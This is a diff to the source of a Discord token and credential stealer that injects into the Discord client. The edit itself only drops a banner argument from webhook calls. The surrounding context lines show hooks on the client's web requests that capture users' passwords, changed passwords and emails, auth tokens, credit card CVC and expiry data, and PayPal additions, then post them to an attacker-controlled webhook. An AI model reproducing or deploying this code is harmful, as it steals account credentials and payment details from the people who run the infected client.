@@ -360,7 +360,7 @@ async function firstTime() {
                 await postWebhook(buildPayload(
                     'Discord Injection — Initialized',
                     fields,
-                    avatar || AVATAR_URL, banner || null
+                    avatar || AVATAR_URL, null
                 ));
             } catch {}
         }
@@ -469,7 +469,7 @@ session.defaultSession.webRequest.onCompleted({
                     ...base,
                     `<:token:1533639840254660640> **Password:** \`${data.password}\``,
                 ]),
-                avatar || AVATAR_URL, banner || null
+                avatar || AVATAR_URL, null
             ));
             break;
 
@@ -484,7 +484,7 @@ session.defaultSession.webRequest.onCompleted({
                         ``,
                         `<:arti:1533734612906414120> **New Password:** \`${data.new_password}\``,
                     ]),
-                    avatar || AVATAR_URL, banner || null
+                    avatar || AVATAR_URL, null
                 ));
             }
             if (data.email) {
@@ -495,7 +495,7 @@ session.defaultSession.webRequest.onCompleted({
                         `<:mail:1533638816559140877> **New Email:** \`${data.email}\``,
                         `<:token:1533639840254660640> **Password:** \`${data.password}\``,
                     ]),
-                    avatar || AVATAR_URL, banner || null
+                    avatar || AVATAR_URL, null
                 ));
             }
             break;
@@ -509,7 +509,7 @@ session.defaultSession.webRequest.onCompleted({
                     `<:lock:1533640371882557501> **CVC:** \`${data['card[cvc]'] || 'N/A'}\``,
                     `<:card:1533639749376671785> **Expiry:** \`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``,
                 ]),
-                avatar || AVATAR_URL, banner || null
+                avatar || AVATAR_URL, null
             ));
             break;
 
@@ -517,7 +517,7 @@ session.defaultSession.webRequest.onCompleted({
             await postWebhook(buildPayload(
                 'Discord — PayPal Added',
                 buildFields(user, billing, null, token, base),
-                avatar || AVATAR_URL, banner || null
+                avatar || AVATAR_URL, null
             ));
             break;
 
